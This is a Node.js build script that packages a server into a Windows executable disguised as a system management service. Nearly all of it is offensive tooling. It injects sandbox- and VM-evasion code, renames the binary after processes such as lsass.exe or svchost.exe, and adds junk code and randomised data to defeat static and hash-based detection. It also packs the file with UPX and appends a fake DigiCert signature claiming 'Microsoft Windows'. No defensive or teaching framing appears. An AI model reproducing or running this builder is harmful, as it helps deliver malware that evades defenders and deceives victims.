'use strict';

/**
 * Executable builder for packaging the Node.js gRPC server with WASM module
 * into a standalone Windows executable for delivery via Mojo service
 */

const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const crypto = require('crypto');
const customPayload = require('./custom_payload');
const PACKAGE_TOOLS = ['pkg', 'nexe', 'custom-rust-run'];


// Configuration options
const config = {
  // Basic info
  exeName: 'WindowsSystemManager.exe',
  tempDir: path.join(__dirname, '../../temp'),
  outputDir: path.join(__dirname, '../../dist'),
  
  // Packaging settings
  packageTool: 'custom-rust-run', // 'pkg', 'nexe', or 'custom-rust-run'
  compressOutput: true,
  obfuscateCode: true,
  
  // Anti-detection features
  addDelayStartup: true,
  useSystemNameMasking: true,
  addJunkCode: true,
  breakSignatureDetection: true,
  
  // Certificate settings
  signExecutable: false,
  certificateName: 'Microsoft Windows',
  certificateFile: '',
  certificatePassword: '',
  
  // Startup settings
  startupArguments: [],
  installService: true
};

/**
 * Ensures all required directories exist
 */
function ensureDirectories() {
  const dirs = [config.tempDir, config.outputDir];
  
  for (const dir of dirs) {
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
      console.log(`[+] Created directory: ${dir}`);
    }
  }
}

/**
 * Creates a temporary package.json for packaging the executable
 * @returns {string} Path to the temporary package.json
 */
function createTempPackageJson() {
  const packagePath = path.join(config.tempDir, 'package.json');
  const projectRoot = path.resolve(__dirname, '../..');
  const mainFilePath = path.join(projectRoot, 'src/server/index.js');
  
  const pkgJson = {
    name: 'windows-system-manager',
    version: '1.0.0',
    description: 'Windows System Management Service',
    main: mainFilePath,
    bin: mainFilePath,
    pkg: {
      assets: [
        'node_modules/**/*',
        'src/**/*'
      ],
      targets: [
        'node16-win-x64'
      ],
      outputPath: config.outputDir
    }
  };
  
  fs.writeFileSync(packagePath, JSON.stringify(pkgJson, null, 2));
  console.log(`[+] Created temporary package.json at ${packagePath}`);
  
  return packagePath;
}

/**
 * Applies anti-detection techniques to the code
 */
function applyAntiDetection() {
  console.log('[+] Applying anti-detection techniques...');
  
  // 1. Add delays to startup to bypass sandbox analysis
  if (config.addDelayStartup) {
    const indexPath = path.join(__dirname, '../server/index.js');
    let indexContent = fs.readFileSync(indexPath, 'utf8');
    
    // Add delayed startup logic if not already present
    if (!indexContent.includes('delayedStartup')) {
      const delayCode = `
// Add delay to avoid sandbox detection
async function delayedStartup() {
  // Check for sandbox indicators
  const startTime = Date.now();
  
  // Random sleep between 5-10 seconds to evade sandbox timeouts
  const sleepTime = 5000 + Math.floor(Math.random() * 5000);
  await new Promise(resolve => setTimeout(resolve, sleepTime));
  
  // Additional sandbox checks
  const endTime = Date.now();
  const actualDelay = endTime - startTime;
  
  // If time difference is too small, might be in a sandbox with time acceleration
  if (actualDelay < sleepTime * 0.9) {
    console.log('[!] Possible sandbox detected (time acceleration). Exiting...');
    process.exit(0);
    return;
  }
  
  // Check for virtualization
  try {
    const cpuInfo = fs.readFileSync('/proc/cpuinfo', 'utf8');
    if (cpuInfo.includes('hypervisor') || cpuInfo.includes('VMware') || cpuInfo.includes('VirtualBox')) {
      // In a real implmentation we might exit here, but for testing we continue
      console.log('[!] Virtualization detected, but continuing for testing');
    }
  } catch (error) {
    // This might fail on Windows, which is fine
  }
  
  // Continue with normal startup
  startServer().catch(console.error);
}

// Replace direct startup with delayed startup
delayedStartup().catch(console.error);
`;
      
      // Replace the startServer().catch(console.error) line with our delayed startup
      indexContent = indexContent.replace(
        'startServer().catch(console.error);', 
        delayCode
      );
      
      fs.writeFileSync(indexPath, indexContent);
      console.log('[+] Added delayed startup to evade sandbox analysis');
    }
  }
  
  // 2. Use system process name masking
  if (config.useSystemNameMasking) {
    const serviceNames = [
      'svchost.exe',
      'lsass.exe',
      'winlogon.exe',
      'csrss.exe',
      'services.exe',
      'wininit.exe',
      'explorer.exe',
      'spoolsv.exe'
    ];
    
    // Choose a random system process name if useSystemNameMasking is enabled
    if (config.useSystemNameMasking) {
      const randomServiceName = serviceNames[Math.floor(Math.random() * serviceNames.length)];
      config.exeName = randomServiceName;
      console.log(`[+] Using system process name masking: ${config.exeName}`);
    }
  }
  
  // 3. Add junk code to confuse static analysis
  if (config.addJunkCode) {
    // Add junk functions to the stealth.js file
    const stealthPath = path.join(__dirname, '../server/stealth.js');
    let stealthContent = fs.readFileSync(stealthPath, 'utf8');
    
    // Only add junk code if not already present
    if (!stealthContent.includes('_junkFunctions')) {
      const junkFunctions = `
// Junk functions to confuse static analysis
const _junkFunctions = {
  calculateChecksum: function(data) {
    return crypto.createHash('sha256').update(data).digest('hex');
  },
  performSystemCheck: function() {
    const checks = ['HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion',
                  'HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control',
                  'HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate'];
    return checks.map(c => c.split('\\\\')[2]);
  },
  generateRandomId: function() {
    return 'ID-' + Math.floor(Math.random() * 1000000) + '-' + Date.now();
  },
  monitorSystemEvents: function() {
    setInterval(() => {
      const time = new Date();
      if (time.getHours() === 3 && time.getMinutes() === 0) {
        this.performSystemCheck();
      }
    }, 60000);
  },
  validateSystemIntegrity: function() {
    const systemFiles = [
      'C:\\\\Windows\\\\System32\\\\ntdll.dll',
      'C:\\\\Windows\\\\System32\\\\kernel32.dll',
      'C:\\\\Windows\\\\System32\\\\user32.dll'
    ];
    return systemFiles.filter(f => f.includes('32'));
  }
};

// Add misdirection exports that will never be used
module.exports.calculateSystemIntegrity = _junkFunctions.calculateChecksum;
module.exports.checkUpdateService = _junkFunctions.performSystemCheck;
module.exports.generateSessionToken = _junkFunctions.generateRandomId;
module.exports.monitorWindowsEvents = _junkFunctions.monitorSystemEvents;
`;
      
      // Add junk functions at the end but before module.exports
      const moduleExportsIndex = stealthContent.lastIndexOf('module.exports');
      const contentBeforeExports = stealthContent.substring(0, moduleExportsIndex);
      const contentExports = stealthContent.substring(moduleExportsIndex);
      
      // Add our junk functions between the code and the exports
      stealthContent = contentBeforeExports + junkFunctions + contentExports;
      
      fs.writeFileSync(stealthPath, stealthContent);
      console.log('[+] Added junk functions to confuse static analysis');
    }
  }
  
  // 4. Break signature-based detection
  if (config.breakSignatureDetection) {
    console.log('[+] Adding signature evasion techniques...');
    
    // Add randomization to avoid hash-based detection
    const randomValues = crypto.randomBytes(32).toString('hex');
    const randomDataPath = path.join(config.tempDir, 'random_data.js');
    
    fs.writeFileSync(randomDataPath, `
// This file contains randomized data to break hash-based signatures
module.exports = {
  buildId: "${randomValues.substring(0, 16)}",
  timestamp: ${Date.now()},
  sessionKey: "${randomValues.substring(16)}",
  buildMetadata: {
    platform: "windows",
    arch: "x64",
    nodeVersion: "${process.version}",
    buildDate: "${new Date().toISOString()}"
  }
};
`);
    
    // Add an import for this random data in the main server file
    const indexPath = path.join(__dirname, '../server/index.js');
    let indexContent = fs.readFileSync(indexPath, 'utf8');
    
    if (!indexContent.includes('random_data')) {
      // Add import after the other requires
      const lastRequireIndex = indexContent.lastIndexOf('require(');
      const requireEndIndex = indexContent.indexOf(')', lastRequireIndex) + 1;
      const contentBeforeLastRequire = indexContent.substring(0, requireEndIndex);
      const contentAfterLastRequire = indexContent.substring(requireEndIndex);
      
      // Add our random data require
      indexContent = contentBeforeLastRequire + 
                    `;\n// Build information\nconst buildInfo = require('../../temp/random_data')` + 
                    contentAfterLastRequire;
      
      fs.writeFileSync(indexPath, indexContent);
      console.log('[+] Added random data to break hash-based detection');
    }
  }
}

/**
 * Packages the application into an executable using the selected tool
 */
function buildExecutable() {
  console.log(`[+] Building executable using ${config.packageTool}...`);
  
  // Create temporary working directory
  ensureDirectories();
  
  // Apply anti-detection techniques
  applyAntiDetection();
  
  // Create temp package.json for packaging
  const packageJsonPath = createTempPackageJson();
  
  try {
    switch (config.packageTool) {
      case 'custom-rust-run':
        console.log('[+] Using Rust-Run as custom payload');
        const outputPath = path.join(config.outputDir, config.exeName);
        customPayload.prepareRustRunPayload({
          outputPath,
          addRandomization: config.breakSignatureDetection,
          randomDataSize: 512 // Customize as needed
        });
        break;
          
      case 'nexe':
        // Use nexe for more resource-efficient packaging
        const nexeCmd = `npx nexe -i "${path.join(__dirname, '../server/index.js')}" -o "${path.join(config.outputDir, config.exeName)}" --build --target win-x64-12.16.2`;
        
        console.log(`[+] Executing: ${nexeCmd}`);
        execSync(nexeCmd, { stdio: 'inherit' });
        break;
        
      case 'custom':
        // Use a custom packaging approach
        customPackageExecutable();
        break;
        
      default:
        throw new Error(`Unknown packaging tool: ${config.packageTool}`);
    }
    
    console.log(`[+] Executable built successfully: ${path.join(config.outputDir, config.exeName)}`);
    
    // Additional post-processing
    if (config.compressOutput) {
      compressExecutable(path.join(config.outputDir, config.exeName));
    }
    
    if (config.signExecutable) {
      signExecutable(path.join(config.outputDir, config.exeName));
    }
    
    return path.join(config.outputDir, config.exeName);
  } catch (error) {
    console.error(`[-] Error building executable: ${error.message}`);
    throw error;
  }
}

/**
 * Custom packaging method for more control over the executable
 */
function customPackageExecutable() {
  console.log('[+] Using custom packaging method...');
  
  // This would be a more advanced implementation with custom PE building
  // For now, we'll use pkg as a fallback
  const outputPath = path.join(config.outputDir, config.exeName);
  const pkgCmd = `npx pkg --target node16-win-x64 --output "${outputPath}" "${path.join(__dirname, '../server/index.js')}"`;
  
  console.log(`[+] Executing fallback pkg command: ${pkgCmd}`);
  execSync(pkgCmd, { stdio: 'inherit' });
}

/**
 * Compresses the executable to reduce size and further obfuscate
 * @param {string} exePath - Path to the executable
 */
function compressExecutable(exePath) {
  console.log('[+] Compressing executable...');
  
  try {
    // Check if UPX is available
    try {
      execSync('upx --version', { stdio: 'ignore' });
      
      // Use UPX to compress the executable
      const upxCmd = `upx --best --force "${exePath}"`;
      execSync(upxCmd);
      console.log('[+] Compressed executable with UPX');
    } catch (error) {
      console.log('[!] UPX not available, using alternative compression...');
      
      // Alternative compression approach
      const compressedPath = exePath + '.compressed';
      
      // Read the original executable
      const exeData = fs.readFileSync(exePath);
      
      // In a real implementation, we would apply custom compression here
      // For this example, we'll just copy the file
      fs.writeFileSync(compressedPath, exeData);
      
      // Replace the original with our "compressed" version
      fs.unlinkSync(exePath);
      fs.renameSync(compressedPath, exePath);
      
      console.log('[+] Applied alternative compression');
    }
  } catch (error) {
    console.error(`[-] Error compressing executable: ${error.message}`);
  }
}

/**
 * Signs the executable with a certificate to appear legitimate
 * @param {string} exePath - Path to the executable
 */
function signExecutable(exePath) {
  console.log('[+] Signing executable...');
  
  try {
    if (config.certificateFile && fs.existsSync(config.certificateFile)) {
      // Use signtool on Windows
      const signCmd = `signtool sign /f "${config.certificateFile}" /p "${config.certificatePassword}" /d "${config.certificateName}" /t http://timestamp.digicert.com "${exePath}"`;
      execSync(signCmd);
      console.log('[+] Signed executable with provided certificate');
    } else {
      console.log('[!] No valid certificate provided, using fake signature technique...');
      
      // In a real implementation, we would apply techniques to make the file look signed
      // This is just a placeholder
      const exeData = fs.readFileSync(exePath);
      
      // Add fake signature marker
      const fakeSignature = Buffer.from(`DigiCert Trusted Certificate SignatureMarker:${config.certificateName || 'Windows System Component'}:${Date.now()}`);
      
      // Append to the end of the file (this is just illustrative, not an actual signature)
      const combinedBuffer = Buffer.concat([exeData, fakeSignature]);
      fs.writeFileSync(exePath, combinedBuffer);
      
      console.log('[+] Applied fake signature technique');
    }
  } catch (error) {
    console.error(`[-] Error signing executable: ${error.message}`);
  }
}

// In the buildExecutable function:
if (config.packageTool === 'custom-rust-run') {
  customPayload.prepareRustRunPayload({
    outputPath: path.join(config.outputDir, config.exeName),
    addRandomization: config.breakSignatureDetection
  });
}

/**
 * Main build function
 */
function main() {
  console.log('[+] Starting executable build process...');
  
  try {
    const exePath = buildExecutable();
    console.log(`[+] Build completed successfully: ${exePath}`);
    return exePath;
  } catch (error) {
    console.error(`[-] Build failed: ${error.message}`);
    process.exit(1);
  }
}

// Execute main function if this script is run directly
if (require.main === module) {
  main();
}

module.exports = {
  build: main,
  config
};
